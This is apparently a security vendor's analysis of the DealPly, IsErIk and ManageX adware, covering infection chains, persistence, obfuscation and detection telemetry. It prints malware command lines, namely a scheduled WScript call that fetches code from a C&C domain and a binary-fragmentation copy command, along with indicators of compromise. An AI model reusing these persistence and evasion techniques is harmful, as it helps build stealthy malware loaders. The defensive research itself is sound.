A lot of them are overlooked and underestimated because they’re not supposed to cause harm — as its name\nsuggests, adware is advertising-supported software. However, we have constantly observed suspicious activities caused by adware, with common behaviors that\ninclude access to seemingly random domains with alternating consonant and vowel names, scheduled tasks, and in-memory execution via WScript that has proven to\nbe an effective method to hide their operations for at least four years.\n\n[We will walk you through our analysis of three adware events that we eventually linked and variously named as Dealply, IsErIk, and ManageX. We studied these](https://download.bitdefender.com/resources/files/News/CaseStudies/study/284/Bitdefender-WhitePaper-Erik-CREA3910-en-EN-interactive.pdf)\nevents from their persistence mechanisms to repetitive malicious domain access via root cause analysis (RCA) chains and uncovered several artifacts that proved\noverlaps in the three infections.\n\nThis research also discusses two case studies that show how adware could remain in systems for weeks, if not months, to complete its routine, and how they arrive in\nthe system. The adware DealPly (sometimes also referred to as IsErIk) and malicious Chrome extension ManageX, for instance, can come bundled under the guise of\na legitimate installer and other potentially unwanted applications (PUAs). Because various write-ups cover Dealply or IsErik separately, the technical discussion and\nrepresentation of both are discussed separately.\n\nOur analysis also reveals how these adware variants use various stealthy and suspicious techniques to perform their routines. IsErik and Dealply, for instance, could\nload a piece of code coming from a remote server. Although we did not observe malware activities through the adware, we cannot discount the possibility that they\ncould be used maliciously.\n\n### Initial indicators\n\nAmong the thousands of logs our security analysts process each day, three persistent ones stood out due to the volume of alerts they generated and their\nrepetitiveness. Aside from the reoccurring detections, these were also widely affecting a lot of other Trend Micro customers subscribed to Managed XDR.\n\n(1) Here’s a sample URL; many of the URLs we found related to this case looked like this. We eventually linked this to JS.MANAGEX (a browser extension also\nknown as [Bujo).

Powered {random name}.job like with IsErIk), or use a name that looks like a GUID like with\nDealPly\n\n\nGo to…\n\n\n-----\n\n_Figure 1. Imitated scheduled tasks_\n\n(3) A JavaScript saved as a .txt file (detected by Trend Micro as Adware.JS.DEALPLY.SMMR) is also executed via WScript with hex-encoded parameters and a\ncommon string “—IsErIk”.\n\n_Figure 2. Executed .txt file via WScript_\n\nBelow we will look into two case studies that exhibited the abovementioned indicators and summarize the noteworthy points in our analyses of their routines.\n\n### Case study #1: Root cause analysis (RCA) – February 2020 infection\n\nIllustrated below is a simplified version of the RCA of a recent infection in a Managed XDR-monitored endpoint. It shows how Dealply, ManageX, and other PUAs\nsuch as Segurazo Fake AV can be bundled together in one installation.\n\n_Figure 3. A simplified version of the RCA of a recent infection in a Managed XDR-monitored endpoint_\n\nThe infection began with the file called email_open_view_pro_free.exe, which, judging from the way it was launched via explorer.exe, was manually executed by\nthe user. Its descriptive filename also suggests that it could have been downloaded from the internet as a seemingly legitimate installer or freeware.\n\nThe email_open_view_pro_free.exe file created 2 new processes:\n\n“Segurazo.exe” – an installer that we know is a fake AV (detected as PUA.MSIL.Segurazo.SMCS); “segurazo” also means “security” in Portuguese\n“danuci.exe” – created furthermore indicators that we later on recognized as DealPly\n\nIt should be noted that DealPly files are normally named like this. They seem random, with alternating consonants and vowels. Names like “danuci” and “netenare”\nare names that could be suspected as DealPly right away just by looking at their filenames.\n\nThe file netenare.exe then creates two .dat files and joins them to form syncversion.exe, a file we also detect as DealPly. The executable also initiates access to the\nblocked server pajuwu[.]com, a domain known to be generated by DealPly binaries.\n\nIn each of these nodes, there were little details not shown in the graphical representation that we think are important to mention. For instance, aside from\n_netenare.exe, danuci.exe also created files like the following:_\n\nc:\\users\\<user>\\appdata\\roaming\\mozilla\\firefox\\profiles\\m9kxv7k5.default-release\\extensions\\{24436206-088d-4a1a-8d0e-cf93ca7a2d23}.xpi\nc:\\users\\<user>\\appdata\\local\\chromium\\user data\\default\\local storage\\chrome-extension_ncjbeingokdeimlmolagjaddccfdlkbd_0.localstorage-journal\nc:\\users\\<user>\\appdata\\local\\chromium\\user data\\default\\local storage\\chrome-extension_ncjbeingokdeimlmolagjaddccfdlkbd_0.localstorage\nc:\\users\\<user>\\appdata\\local\\chromium\\user data\\default\\local storage\\chrome-extension_jghiljaagglmcdeopnjkfhcikjnddhhc_0.localstorage-journal\n\n**Chrome (AppID)** **Firefox**\nNcjbeingokdeimlmolagjaddccfdlkbd\n{24436206-088d-4a1a-8d0e-cf93ca7a2d23}.xpi\nJghiljaagglmcdeopnjkfhcikjnddhhc\n\n_Table 1. Installation of several browser extensions_\n\nA quick Google search links the two Chrome AppIDs to domains we know are being used by the ManageX Chrome extension. ManageX uses a malicious extension\nto the Chrome browser to track users’ browser activities and communicate with C&C domains. Further information about ManageX can be found in our [virus report,](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojan.js.managex.a)\nincluding the contents of the Chrome extension such as various permissions and related C&C servers.\n\n_Figure 4.

AppID jghiljaagglmcdeopnjkfhcikjnddhhc linked to nusojog[.]com_\n\n### Case study #2: Timeline of an older infection (2016-2017)\n\nIn another case we looked into, we observed the same domains across the environment. Since these were easily caught with our filters and we were already quite\nfamiliar with the indicators, we were able to perform in-depth analyses on several of the endpoints.\n\nBased on our findings, the hosts within the environment got infected as early as 2016. Despite being relatively dated, we thought that an in-depth analysis of this 2016\ninfection was still relevant since it gave us a better understanding of the adware’s progression and timeline.\n\nThe first thing we noticed was the presence of both DealPly and IsErik’s scheduled tasks. Based on previously known infections, we usually see DealPly create a .job\nfilename that looks like a GUID, while IsErik usually uses something related to a search engine, which we saw in the endpoint we were looking at:\n\n_Figure 6. IsErIk involves search engines in its routine_\n\nAfter identifying the relevant time ranges, we expanded our search on the file system. The search found several other suspicious files in the same endpoint that we\nthink are related.\n\n_Figure 7. Files arranged according to their creation timestamps_\n\nAfter tracing back the file timestamps, we found that the first suspicious indicator created in June 2016 was %AppData%\\Local\\{F440C21C-D0E8-AEA4-BD70**8B4C991877D4}, and it came with several other things:**\n\n\n-----\n\n_Figure 8. Other directories and a file created along with the first indicator_\n\nUsing the timeline from the NTFS MFT (master file table), we were able to pinpoint one file for analysis: conf.db. By itself, it is non-malicious and only contains\nunknown MD5 hashes. It is a possible indication that this is bundled with other installations, similar to Case Study #1.\n\n**_Going through the timeline as early as July 2016_**\n\nTo understand what happened during this installation, we need to analyze the events beginning with the scheduled task. This is what “Yahoo! Powered ronof.job”\nwill execute:\n\nC:\\Windows\\system32\\wscript.exe “C:\\ProgramData\\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\\sole.txt” “687474703a2f2f7761676e672e636f6d”\n“433a5c50726f6772616d446174615c7b39443032353836312d313734302d443241372d393138362d3443453530424334433732427d5c6e69666f7261”\n“433a5c50726f6772616d446174615c7b39443032353836312d313734302d443241372d393138362d3443453530424334433732427d5c6e65746564656e”\n“//B” “//E:jscript” “–IsErIk”\n\nAfter decoding this, it will return with:\n\nC:\\Windows\\system32\\wscript.exe “C:\\ProgramData\\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\\sole.txt” “http://wagng[.]com” “C:\\ProgramData\\\n{9D025861-1740-D2A7-9186-4CE50BC4C72B}\\nifora” “C:\\ProgramData\\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\\neteden” “//B”\n“//E:jscript” “–IsErIk”\n\nThis means that when the scheduled task is triggered, it will run “C:\\ProgramData\\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\\sole.txt” as JavaScript via\n_wscript.exe. During the analysis, this file was non-existent. It is assumed that it was deleted after execution. The file sole.txt is then called with the following_\nparameters:\n\nhttp://wagng[.]com\nC:\\ProgramData\\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\\nifora\nC:\\ProgramData\\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\\neteden\n–IsErIk\n\nTrend Micro detects similar JavaScripts as Adware.JS.DEALPLY.SMMR, also known as advanced persistent adware or [IsErIk externally.](https://download.bitdefender.com/resources/files/News/CaseStudies/study/284/Bitdefender-WhitePaper-Erik-CREA3910-en-EN-interactive.pdf)\n\nThe first thing it checks is if the JavaScript was called with the last argument “—IsErIk”. If not, the script execution terminates. Based on its code, the file aowLC\nserves as an indicator of the adware’s last update time. It uses the file’s last modified date for this purpose.\n\nIf all conditions are met, the script proceeds on the rest of its code where these two files were read:\n\n**hdat2 – contains hex-encoded strings that represents the parameters passed to a URL. (i.e., “?v=2.2&pcrc=167877582&rv=4.0”)**\n**hdat1 – the contents of this file will be sent to the server specified as a parameter when the script was called**\n\nThe script’s main purpose is to communicate with the server specified as a parameter (wagng[.]com in this case) via HTTP POST and to execute another script in\nmemory when the server responds. Response from the server is decoded using its custom decryption routine and then ran as a new function.\n\n_Figure 9. Script for connecting to a remote server via HTTP POST_\n\nWe noticed in the July 2, 2016 entry that aowLC (the infection marker) was created exactly 12 hours after the scheduled task, indicating the first time the IsErIk script\nwas executed. (This scheduled task was likely set to run every 12 hours.) At this point, it appears the script could not get any response from the server, which is why\n_aowLC was the last created file that day. However, we can infer that on July 30 and November 18, the script successfully contacted the server, which consequently led_\nto the creation of DealPly-related files.\n\n_Figure 10. Recorded DealPly-created files_\n\nInstallation of the new adware files continued until September 2017, as we can also see from the timeline we showed earlier.\n\n**_Layers of obfuscation_**\n\nTo understand why an adware variant would use such complex installation techniques, we examined the other available remaining files. In this list, we found several\nencrypted PE files that were particularly interesting. For one thing, some of them looked like this:\n\n\n-----\n\n_Figure 11. An encrypted PE file_\n\n_Figure 12. A simple XOR decryption revealed a hidden PE file_\n\n**Trend Micro Pattern**\n**Filename** **SHA-1 (Decrypted)**\n\n**Detection**\n\n71370B5A77BFF01A627A0B92BDD31 PUA.Win32.DealPly.UB\nrino.dat\n\nDC48B946FCA CD\n\n22BB3F2F3F8A4EC991198EFB425B0\nrino (1).dat PUA_DEALPLY.SM\n\nA35F30A12C2\n\n_Table 2. Some of the files that used simple XOR decryption_\n\nOur analysis revealed that rino.dat and rino (1).dat are both updated copies of the DealPly installer. Similar to netenare.exe in Case Study #1, it creates two .dat files\nand joins them to form an executable file. These are the most common filenames used for the newly formed executables:\n\nSync.exe\nSynctask.exe\nSyncversion.exe\nUpdane.exe\nUpdater.exe\nUpdTask.exe\n\nAfter this, a scheduled task will be created to run the new executable file on schedule. In the 2017 timeline (January 18 to be exact), the file created was “sync.exe”\nwith the corresponding scheduled task of “{3CB9B109-866A-591E-48D3-17289C7F88F1}.job”. In some cases, a VBScript is used to create a RunOnce autostart for\nthe executable.\n\nNormally, these newly formed files with auto-start also connect to a remote server. In a sample we analyzed from another case, the server responded with an XORencrypted DLL after it sent the following information via HTTP POST:\n\n_Figure 13. Data shown before encryption_\n\nDuring analysis, the DLL file was not saved on disk, indicating reflective loading. It is also responsible for creating the following files, which are also evident in the\ntimeline above:\n\ninfo.dat\nTTL.DAT\nWB.cfg\n\nThese files are non-executable and only contain installation details such as installation date and last operating system. Eventually, the DLL will attempt to download\nanother .dat file. Unfortunately, we were unable to get a download response during our testing; based on the timing sequence, we surmise that sb953.dat and\n_sb703.dat might be the response._\n\nEnsilo (now Fortinet) described DealPly’s network communication and other interesting behaviors in detail [here.](https://web.archive.org/web/20190802203850/https:/blog.ensilo.com/leveraging-reputation-services)\n\n**_Hidden facts_**\n\nThe other encrypted files were also PE files, but the headers aren’t quite right.\n\n\n-----\n\n_Figure 14. Another encrypted PE file_\n\nEven though we do not have the decryption code and are unable to fully decrypt these files, we eventually figured out how to extract the strings from the file by using\na translate function wherein each character is swapped with another one in the ASCII table. For example, “c” is swapped with “x,” “F” with “L,” and so on. Each file\nhas a different translation table.

Filenames and corresponding interesting strings_\n\nWe observed that most machines with a DealPly infection also have Sqlite3.dll (non-malicious) in the adware folder. (It is to be noted that Sqlite is an extensively\nused database format. Coincidentally, the encrypted files (bapi_ie.dat, bapi_chmm.dat, and bapi_ff.dat) also contain SQLite-related strings, which suggest that the\nfiles may be used to perform database-related tasks.\n\nSince we could not fully decrypt these files, we were also unable to analyze them to identify their purpose. Based on the partially extracted strings and combined with\nthe fact that sqlite3.dll was observed in our analysis, it is highly possible that it would be used to interact with the SQLite databases of browsers within the system, as\nit is known that both [Chrome and](https://www.sans.org/blog/google-chrome-forensics/) [Firefox utilize SQLite databases to store their data.](https://www.acquireforensics.com/services/tech/mozilla-firefox.html)\n\nThe other set of files contains libcurl-related strings, which is a multi-protocol file transfer library. That being said, it has the potential to interface with multiple\nprotocols like HTTPS, HTTP, or FTP. It is unclear if this library has been used for malicious purposes, but in a [2018 report, these strings were also found in samples](https://www.us-cert.gov/ncas/analysis-reports/AR18-275A)\nthat were once used by the APT group Hidden Cobra as a proxy module to allow incoming connections and force the infected system to act as a proxy server.\n\n### Noteworthy points from our analyses\n\nDealPly and ManageX can come bundled in a seemingly legitimate installer, along with other PUAs. We observed the same entry point as Case Study #1 in\nanother machine, which was called “Baixaki_Baixar Musicas Gratis_3890201077.exe” (translates to Baixaki_Download Free Music_3890201077.exe in\nPortuguese). But it did not come with the Segurazo fake AV.\n\n_Figure 15. Infection chain without the fake AV_\n\nThere was no concrete evidence in Case Study #2 regarding the source, but based on the artifacts created on the first infection date, it might also have come\nfrom a software installation bundle.\n\nThe installation of this adware is highly modular and does not complete its routine right away. Based on our observation, it takes a few weeks to months before\nit can connect to its servers successfully.\nThe technique used by this adware, whereby two files are conjoined to form another file, is called binary fragmentation and is used to evade detection. Carbon\nBlack [published an article years ago about how it was used by Operation Aurora. Below is an example of the fragmentation technique seen in one of our](https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/)\nanalyses:\n\nCLI: c:\\windows\\syswow64\\cmd.exe /c cmd /d /c copy /b /y /v\n“c:\\users\\\\appdata\\local\\temp\\d3284081000781.dat”+”c:\\users\\\\appdata\\local\\temp\\d3284081000782.dat”\n“c:\\users\\\\appdata\\roaming\\14be90~1\\syncversion.exe” & cmd /d /c del “c:\\users\\\\appdata\\local\\temp\\d3284081000781.dat” & cmd /d /c del\n“c:\\users\\\\appdata\\local\\temp\\d3284081000782.dat”\n\nCarbon Black researchers also believed that threat actors are using known adware variants, including DealPly, as a delivery mechanism for ransomware and other\nmalware. While we have observed several cases of ransomware in the same machines infected by DealPly, we have no concrete evidence to prove their relationship.\nIn spite of this, we agree that this adware can easily be used as an agent to deliver malware covertly, given its modular nature.\n\n### Global distribution\n\nOur telemetry indicates the widespread installation of the mentioned PUAs, with the United States, Japan, and Taiwan topping the counts. The IsErIk count is based\non behavior monitoring, which detects the command line parameter “–IsErIk”, while both DealPly and ManageX are based on signature-based detections data from\nthe Trend Micro™ Smart Protection Network™ security infrastructure.\n\n\n-----\n\n_Figure 16. Top 10 affected countries,_\n_based on data from the Trend Micro Smart Protection Network infrastructure for the period of December 18, 2019 to March 17, 2020_\n\nAmong all users with known industry classifications, the top industries across all the three adware detections mentioned above were consistent: Education,\nGovernment, and Manufacturing.\n\n_Figure 17. Top 10 affected industries,_\n_based on data from the Trend Micro Smart Protection Network infrastructure for the period of December 18, 2019 to March 17, 2020_\n_Note: We removed duplicated counts based on GUIDs. This means that the counts include multiple endpoints belonging to the same company._\n\n### Correlating DealPly, IsErIk and ManageX\n\nWhen we started our probe, we considered all these as separate even though they share common traits such as the use of scheduled tasks and the similar way its\nservers were named. However, through Managed XDR, we were able to link them together. To see if this is consistent with global data, we gathered more information\nfrom SPN.\n\n_Figure 18. The number of DealPly, IsErIk, and ManageX detections and their infection intersections in endpoints, based on data from the Trend Micro Smart_\n_Protection Network infrastructure for the period of December 18, 2019 to March 17, 2020: DealPly led the number of detections; we also observed the three threats_\n\n_to have concurring infections in machines._\n\nWhile there are significantly higher numbers for individual detections, hundreds to thousands of intersections between two or three of these adware do not seem like a\ncoincidence. Furthermore, the large number of detections could be attributed to detection coverage, which appears higher for DealPly because of multiple pattern\ndetections.\n\nSince Trend Micro detects a lot of these variants, it is likely that most of these infections were already blocked before complete installation. Therefore, the numbers\nshown in this diagram could be smaller than the actual intersections. Along with the results of our analyses, and considering the points mentioned, we think that there\nis a high likelihood that these adware commonly coexist.\n\nWe also tried to correlated the C&C servers used, but a huge part of it is entirely disconnected. Only two pairs had similarities.\n\n**ManageX** **IP address** **DealPly**\nqamopo[.]com 13.32.230.240 tuwoqol[.]com\nd h[ ] 52 222 149 67 d h[ ]\n\n\n-----\n\nWhile the intersection is too weak to summarize that these three threats are interrelated based on network infrastructure, we do have to point out that the domains\nwere registered through the Israeli registrar Galcomm’s privacy protection service (domainprivacy@galcomm[.]com). A few years back, Ars Technica [ran an article](https://arstechnica.com/information-technology/2015/05/sourceforge-grabs-gimp-for-windows-account-wraps-installer-in-bundle-pushing-adware/)\nabout when SourceForge bundled GIMP for Windows with adware. The installer(s) of GIMP also came bundled with similar adware, which was also registered\nthrough Galcomm’s privacy protection service.\n\n### Conclusion and Trend Micro solutions\n\nMitigating adware (or potentially unwanted applications) would normally be secondary to dealing with threats such as hacking tools, backdoors, and ransomware.\nHowever, there is a large disconnect in dealing with alerts visible through the lens of a security operations center (SOC) analyst: Why is this host suddenly\n_communicating to a command-and-control (C&C) server? How was the threat introduced? Why is it seemingly slipping past defenses?_\n\nThe seemingly disconnected and repetitive alerts for hosts reaching out to C&C servers, and repetitive detections of low priority threat (adware) led us to these three\npoints:\n\nAs evidenced in the details we discussed, linking separate and seemingly disparate events into a single timeline is a definite challenge as threats are turning to\nsophisticated methods to maintain persistence and continuously evolve if not fully mitigated. Using open-source intelligence (OSINT) could only give analysts\na glimpse of its relevant connections and is not as sufficient. Using security expertise also helps provide meaningful alerts and alleviates security operations\nteams.\nThrough the effective use of technologies of a Trend Micro product (Apex One’s Endpoint Detection and Response module called Endpoint Sensor in\nparticular), Trend Micro’s Managed XDR Service was able to perform advanced threat analysis, correlation, and research while monitoring and detecting\nthreats of these highly prevalent clusters of adware.\nOnly through careful observation are details slowly uncovered, delivering analysis of where the attack came from, its infection chain, and mitigation strategies\nover time. Thus, the speed of converting these discoveries and translating them into mitigation strategies is key to improve the security posture of any\nenvironment rapidly.\n\nOrganizations and governments can benefit from advanced Trend Micro solutions that can proactively keep IT environments protected from a wide range of\ncybersecurity threats. The [Trend Micro XDR solution effectively protects connected emails, endpoints, servers, cloud workloads, and networks. Trend Micro XDR](https://www.trendmicro.com/en_us/business/products/detection-response/xdr.html)\nuses powerful AI and expert security analytics to correlate data, as well as deliver fewer higher-fidelity alerts for early threat detection. In a single console, it provides\na broader perspective of enterprise systems as well as a more focused and optimized set of alerts. This provides IT security teams with better context for identifying\nthreats more quickly, helping them understand and remediate impact much more effectively.\n\nMeanwhile, [Trend Micro Managed XDR provides expert threat monitoring, correlation, and analysis from skilled and seasoned Managed Detection and Response](https://www.trendmicro.com/en_us/business/products/detection-response/managed-xdr-mdr.html)\nanalysts. Managed XDR is a flexible, 24/7 service that allows organizations to have one single source of detection, analysis, and response. Analyst expertise is\nenhanced by Trend Micro solutions that are optimized by AI and enriched by global threat intelligence. The Managed XDR service allows organizations to expand\nwith the cloud without sacrificing security or overburdening IT teams.\n\n## Related Posts:\n\n**[Old Tools for New Money: URL Spreading Shellbot and XMRig Using 17-year-old XHide](https://blog.trendmicro.com/trendlabs-security-intelligence/old-tools-for-new-money-url-spreading-shellbot-and-xmrig-using-17-year-old-xhide/)**\n**[New Fileless Botnet Novter Distributed by KovCoreG Malvertising Campaign](https://blog.trendmicro.com/trendlabs-security-intelligence/new-fileless-botnet-novter-distributed-by-kovcoreg-malvertising-campaign/)**\n**[FIN6 Compromised E-commerce Platform via Magecart to Inject Credit Card Skimmers Into Thousands of Online Shops](https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/)**\n**[Outlaw Updates Kit to Kill Older Miner Versions, Targets More Systems](https://blog.trendmicro.com/trendlabs-security-intelligence/outlaw-updates-kit-to-kill-older-miner-versions-targets-more-systems/)**\n\n\nLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:\n\n[ENTERPRISE](http://www.trendmicro.com/us/security-intelligence/enterprise-ransomware/index.html) » [SMALL BUSINESS](http://www.trendmicro.com/us/security-intelligence/small-business-ransomware/index.html) » [HOME](http://www.trendmicro.com/us/home/consumer-ransomware/index.html) »\n\n\nTags: [ChromeIsErIkManageXPUAwscript](https://blog.trendmicro.com/trendlabs-security-intelligence/tag/chrome/)\n\n**0 Comments** **[TrendLabs](https://disqus.com/home/forums/trendlabs/)** [🔒 Privacy Policy](https://help.disqus.com/customer/portal/articles/466259-privacy-policy) [1](https://disqus.com/home/inbox/) **Login**\n\n\n Recommend\n\n\nt Tweet f Share **Sort by Best**\n\n\n### Start the discussion…\n\n\n**LOG IN WITH** **OR SIGN UP WITH DISQUS**\n\n\nName\n\n\nBe the first to comment.\n\n✉ **Subscribe** d **[Add Disqus to your siteAdd DisqusAdd](https://disqus.com/)**\n\n⚠ **D** **[N t S ll M D t](https://disqus.com/data-sharing-settings/)**\n\n### Security Predictions for 2020\n\n\n-----\n\nCybersecurity in 2020 will be viewed through many lenses — from differing attacker motivations and cybercriminal arsenal to technological developments and\nglobal threat intelligence — only so defenders can keep up with the broad range of threats.\n[Read our security predictions for 2020.](https://www.trendmicro.com/vinfo/us/security/research-and-analysis/predictions/2020)\n\n### Business Process Compromise\n\nAttackers are starting to invest in long-term operations that target specific processes enterprises rely on.
